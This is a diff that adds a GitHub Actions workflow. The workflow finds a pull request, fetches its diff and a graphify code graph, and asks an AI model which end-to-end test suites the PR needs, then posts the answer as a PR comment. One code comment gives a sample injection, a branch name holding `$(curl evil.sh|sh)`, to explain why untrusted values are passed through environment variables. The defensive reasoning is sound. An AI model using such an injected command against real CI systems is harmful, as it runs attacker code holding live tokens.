@@ -1,0 +1,273 @@
+---
+# Phase 1 (POC) of diff-aware E2E suite selection, OSAC-4741: the real
+# logic behind osac's e2e-suite-selection-poc.yml. Invoked exclusively via
+# workflow_call from osac's own tiny native workflow_run wrapper (also
+# named e2e-suite-selection-ai.yml) -- workflow_call'd jobs inherit the
+# CALLER's own github.event/github.repository/token, so everything below
+# (github.event.workflow_run.*, github.repository) correctly resolves
+# against osac regardless of this file physically living here, exactly as
+# ai-diagnostic-e2e.yml's own resolve/diagnose jobs already do. This keeps
+# the actual logic in one place instead of duplicated into osac's own
+# wrapper.
+#
+# Purely informational: posts a PR comment showing which E2E suites/tiers
+# this PR appears to need. No required check, nothing gated, no effect on
+# merge -- validates the selection logic (in particular, whether graphify's
+# own query output actually helps Gemini's judgment, which is unconfirmed)
+# before a later phase wires it up for real.
+name: E2E Suite Selection AI Judgment
+
+on:
+  workflow_call: {}
+
+jobs:
+  resolve:
+    name: Resolve PR
+    if: github.event.workflow_run.conclusion == 'success'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions:
+      pull-requests: read
+    outputs:
+      found: ${{ steps.pr.outputs.found }}
+      number: ${{ steps.pr.outputs.number }}
+    steps:
+      # Same "list open PRs, match by head SHA" approach as
+      # ai-diagnostic-e2e.yml's own resolve job -- commits/{sha}/pulls is
+      # empty for unmerged fork SHAs, and github.event.workflow_run.
+      # pull_requests[] is unreliable/empty for genuine cross-fork PRs
+      # (every real PR here).
+      - name: Resolve PR from head SHA
+        id: pr
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
+        run: |
+          set -euo pipefail
+          if ! prs_json=$(gh api --paginate \
+            "repos/${REPO}/pulls?state=open&base=main&per_page=100" \
+            --jq '.[]' | jq -s '.'); then
+            echo "Failed to list open PRs for ${HEAD_SHA:0:7}; skipping."
+            echo "found=false" >> "${GITHUB_OUTPUT}"
+            exit 0
+          fi
+          pr_json=$(jq -c --arg sha "${HEAD_SHA}" '
+            [.[] | select(.state == "open") | select(.head.sha == $sha)]
+            | if length == 1 then .[0] else empty end
+          ' <<<"${prs_json}")
+          if [[ -z "${pr_json}" || "${pr_json}" == "null" ]]; then
+            echo "No unique open PR at ${HEAD_SHA:0:7}; skipping (stale head, or not a PR run)."
+            echo "found=false" >> "${GITHUB_OUTPUT}"
+            exit 0
+          fi
+          echo "found=true" >> "${GITHUB_OUTPUT}"
+          echo "number=$(jq -r '.number' <<<"${pr_json}")" >> "${GITHUB_OUTPUT}"
+
+  judge:
+    name: Judge suite selection
+    needs: resolve
+    if: needs.resolve.outputs.found == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    permissions:
+      contents: read
+      pull-requests: write
+      id-token: write  # Vertex AI WIF auth
+      actions: read     # download the POC run's context artifact
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
+        with:
+          # Pinned explicitly (not github.repository's default) so this
+          # always checks out the scripts/action here (osac-test-infra),
+          # not osac -- github.repository resolves to the CALLER (osac)
+          # when this reusable workflow is invoked via workflow_call, same
+          # as ai-diagnostic-e2e.yml's own checkout step and for the exact
+          # same reason: without this pin, the later `uses:
+          # ./.github/actions/vertex-ai-auth` and `python3 .github/scripts/
+          # select-e2e-suite.py` steps would silently check out osac
+          # instead and fail with "file not found", since neither exists
+          # there.
+          repository: osac-project/osac-test-infra
+          persist-credentials: false
+
+      # Same pattern as ai-diagnostic-e2e.yml's "Download failure artifact"
+      # -- REPO here resolves to osac (the caller), so this is a same-repo
+      # artifact download even though this file lives in osac-test-infra.
+      - name: Download suite-selection context
+        id: context
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          RUN_ID: ${{ github.event.workflow_run.id }}
+        run: |
+          set -euo pipefail
+          EXTRACT_DIR="${RUNNER_TEMP}/suite-selection-context"
+          mkdir -p "${EXTRACT_DIR}"
+          art_json=$(gh api --paginate "repos/${REPO}/actions/runs/${RUN_ID}/artifacts?per_page=100" --jq '.artifacts[]' | jq -s '
+            [.[] | select(.expired == false) | select(.name == "suite-selection-context")]
+            | first // empty
+          ')
+          if [[ -z "${art_json}" || "${art_json}" == "null" ]]; then
+            echo "::error::No suite-selection-context artifact found for run ${RUN_ID}."
+            exit 1
+          fi
+          art_id=$(jq -r '.id' <<<"${art_json}")
+          zip_path="${RUNNER_TEMP}/context.zip"
+          gh api "repos/${REPO}/actions/artifacts/${art_id}/zip" > "${zip_path}"
+          unzip -q -o "${zip_path}" -d "${EXTRACT_DIR}"
+          echo "file=${EXTRACT_DIR}/context.json" >> "${GITHUB_OUTPUT}"
+
+      # Same bounded-diff pattern as ai-diagnostic-e2e.yml's "Fetch PR
+      # changed-files and diff" step -- truncated in raw text BEFORE
+      # JSON-encoding so the prompt size stays predictable regardless of PR
+      # size, and JSON-single-line-encoded so attacker-controlled diff
+      # content can't inject into GITHUB_OUTPUT via a heredoc delimiter
+      # collision.
+      - name: Fetch PR diff
+        id: pr-context
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ needs.resolve.outputs.number }}
+        run: |
+          set -euo pipefail
+          MAX_DIFF_CHARS=8000
+          # Tracked separately from the diff CONTENT (unlike
+          # ai-diagnostic-e2e.yml's identical-looking fetch, where the diff
+          # is just auxiliary context for a free-text diagnosis): here it's
+          # the primary signal behind a structured skip/sanity/regression
+          # decision, so select-e2e-suite.py needs to know outright when
+          # the fetch failed, rather than silently treating a fetch
+          # failure the same as "the PR genuinely has an empty diff" --
+          # both currently collapse to the same empty string otherwise.
+          if raw_diff=$(gh api -H "Accept: application/vnd.github.v3.diff" "repos/${REPO}/pulls/${PR_NUMBER}" 2>/dev/null); then
+            diff_available=true
+          else
+            raw_diff=""
+            diff_available=false
+          fi
+          diff_text="${raw_diff:0:${MAX_DIFF_CHARS}}"
+          if [[ "${#raw_diff}" -gt "${MAX_DIFF_CHARS}" ]]; then
+            diff_text=$(printf '%s\n... (truncated, diff exceeds %s chars)' "${diff_text}" "${MAX_DIFF_CHARS}")
+          fi
+          echo "diff=$(jq -Rs . <<<"${diff_text}")" >> "${GITHUB_OUTPUT}"
+          echo "diff-available=${diff_available}" >> "${GITHUB_OUTPUT}"
+
+      # Best-effort only -- graphify's own query/path CLI is designed for
+      # interactive dev-navigation questions, not as a machine-consumed CI
+      # signal, and this is exactly what this POC exists to validate
+      # empirically. Every step here is allowed to fail without failing the
+      # job: select-e2e-suite.py falls back to judging from the diff alone
+      # if no graphify context shows up (see GRAPHIFY_CONTEXT_FILE there).
+      # Pinned to the same GRAPHIFY_VERSION graphify-brain-refresh.yaml (in
+      # osac) uses, to stay compatible with the published graph-latest
+      # bundle -- kept in sync manually for now; a future iteration should
+      # extract this into one shared source both files read, once this
+      # phase is proven worth keeping.
+      - name: Install graphify (best-effort)
+        id: graphify-install
+        continue-on-error: true
+        env:
+          GRAPHIFY_VERSION: "0.9.41"
+        run: |
+          set -euo pipefail
+          pip install --user --quiet "graphifyy[sql]==${GRAPHIFY_VERSION}"
+          echo "${HOME}/.local/bin" >> "$GITHUB_PATH"
+
+      - name: Fetch and update graphify graph (best-effort)
+        id: graphify-graph
+        if: steps.graphify-install.outcome == 'success'
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+          # Passed via env, never interpolated directly into the run:
+          # script below -- head_branch (and, to a lesser extent,
+          # head_repository.full_name) is chosen entirely by the fork PR's
+          # own author with no sanitization, and GitHub Actions' ${{ }}
+          # substitution is a literal text replacement into the YAML
+          # BEFORE the shell ever runs it. A branch name like
+          # `$(curl evil.sh|sh)` interpolated directly would execute as
+          # arbitrary shell in this job -- which already holds
+          # id-token: write, pull-requests: write, and a live GH_TOKEN.
+          HEAD_REPO: ${{ github.event.workflow_run.head_repository.full_name }}
+          HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
+        run: |
+          set -euo pipefail
+          # Simpler, more permissive extraction than osac's own
+          # .claude/hooks/fetch-graphify-brain.sh (which guards against
+          # symlink/path-traversal attacks when writing into an existing,
+          # already-populated local dev checkout) -- this job's extraction
+          # target is a fresh, empty, ephemeral runner temp directory with
+          # nothing there to clobber, so that specific threat model doesn't
+          # apply here. Can't reuse that script directly either way: it
+          # lives in osac's own repo, and this checkout is of
+          # osac-test-infra (matching every other job in this file).
+          mkdir -p "${RUNNER_TEMP}/graphify-src" "${RUNNER_TEMP}/graphify-out"
+          if ! gh release download graph-latest --repo osac-project/osac \
+               --pattern 'graphify-bundle.tar.gz' --dir "${RUNNER_TEMP}/graphify-src"; then
+            echo "::warning::No published graphify graph-latest bundle found; skipping graphify augmentation."
+            exit 1
+          fi
+          tar xzf "${RUNNER_TEMP}/graphify-src/graphify-bundle.tar.gz" -C "${RUNNER_TEMP}/graphify-out"
+          if [[ ! -f "${RUNNER_TEMP}/graphify-out/graph.json" ]]; then
+            echo "::warning::Fetched bundle missing graph.json; skipping graphify augmentation."
+            exit 1
+          fi
+          # Bring the fetched (hourly, main-branch) graph current with this
+          # PR's own branch via graphify's own incremental update path --
+          # the same code path graphify-brain-refresh.yaml itself exercises
+          # when a prior graph is found. Needs the checked-out PR source to
+          # run against, not this job's own osac-test-infra checkout.
+          git clone --depth 1 \
+            "https://github.com/${HEAD_REPO}.git" \
+            --branch "${HEAD_BRANCH}" \
+            "${RUNNER_TEMP}/osac-pr-src" || \
+          git clone --depth 1 "https://github.com/osac-project/osac.git" "${RUNNER_TEMP}/osac-pr-src"
+          cp -r "${RUNNER_TEMP}/graphify-out" "${RUNNER_TEMP}/osac-pr-src/graphify-out"
+          (cd "${RUNNER_TEMP}/osac-pr-src" && graphify update .) || \
+            echo "::warning::graphify update failed; will fall back to a diff-only judgment."
+          echo "dir=${RUNNER_TEMP}/osac-pr-src/graphify-out" >> "$GITHUB_OUTPUT"
+
+      - name: Authenticate for AI judgment
+        id: vertex-auth
+        uses: ./.github/actions/vertex-ai-auth
+
+      - name: Run suite-selection judgment
+        id: judge-script
+        env:
+          CONTEXT_FILE: ${{ steps.context.outputs.file }}
+          GRAPHIFY_DIR: ${{ steps.graphify-graph.outputs.dir }}
+          PR_DIFF: ${{ steps.pr-context.outputs.diff }}
+          PR_DIFF_AVAILABLE: ${{ steps.pr-context.outputs.diff-available }}
+          GOOGLE_CLOUD_PROJECT: ${{ steps.vertex-auth.outputs.gcp-project }}
+          GOOGLE_CLOUD_LOCATION: ${{ steps.vertex-auth.outputs.gcp-location }}
+          DECISION_FILE: ${{ runner.temp }}/suite-selection-decision.md
+        run: python3 .github/scripts/select-e2e-suite.py
+
+      - name: Post suite-selection comment
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ needs.resolve.outputs.number }}
+          DECISION_FILE: ${{ runner.temp }}/suite-selection-decision.md
+        run: |
+          set -euo pipefail
+          # One sticky comment per PR (found by a hidden marker), replaced
+          # in place on every push -- same reasoning as
+          # ai-diagnostic-e2e.yml's own sticky comment, but a single
+          # section here since this workflow only ever has one thing to
+          # say per PR (not one section per E2E suite).
+          MARKER="<!-- osac-e2e-suite-selection-comment -->"
+          comments_json=$(gh api --paginate "repos/${REPO}/issues/${PR_NUMBER}/comments?per_page=100" --jq '.[] | {id, body}' | jq -s '.')
+          comment_id=$(jq -r --arg marker "${MARKER}" '
+            [.[] | select(.body | startswith($marker))] | if length > 0 then .[0].id else empty end
+          ' <<<"${comments_json}")
+          BODY_FILE="${RUNNER_TEMP}/suite-selection-comment.md"
+          { echo "${MARKER}"; echo; cat "${DECISION_FILE}"; } > "${BODY_FILE}"
+          if [[ -n "${comment_id}" ]]; then
+            jq -Rs '{body: .}' < "${BODY_FILE}" | gh api "repos/${REPO}/issues/comments/${comment_id}" -X PATCH --input -
+          else
+            jq -Rs '{body: .}' < "${BODY_FILE}" | gh api "repos/${REPO}/issues/${PR_NUMBER}/comments" --input -
+          fi
